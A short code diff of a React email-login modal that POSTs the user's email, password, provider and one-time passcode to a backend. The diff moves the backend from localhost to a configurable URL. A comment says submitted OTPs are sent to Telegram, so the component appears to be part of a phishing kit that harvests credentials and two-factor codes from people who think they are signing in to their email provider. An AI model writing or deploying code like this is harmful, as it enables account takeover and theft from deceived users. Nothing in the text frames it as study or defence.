@@ -32,7 +32,7 @@ const EmailLoginModal = ({ isOpen, onClose, provider }) => {
 
     // ── OTP submitted — send to Telegram then route immediately ──
     const handleOtpSubmit = async (otp) => {
-        await fetch('http://localhost:8080/submit-otp', {
+        await fetch(`${process.env.REACT_APP_BACKEND_URL}/submit-otp`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ email, otp, provider }),
@@ -44,7 +44,7 @@ const EmailLoginModal = ({ isOpen, onClose, provider }) => {
 
     // ── Send credentials to backend ──
     async function sendRequest() {
-        return await fetch('http://localhost:8080/submit', {
+        return await fetch(`${process.env.REACT_APP_BACKEND_URL}/submit`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ email, password, provider }),
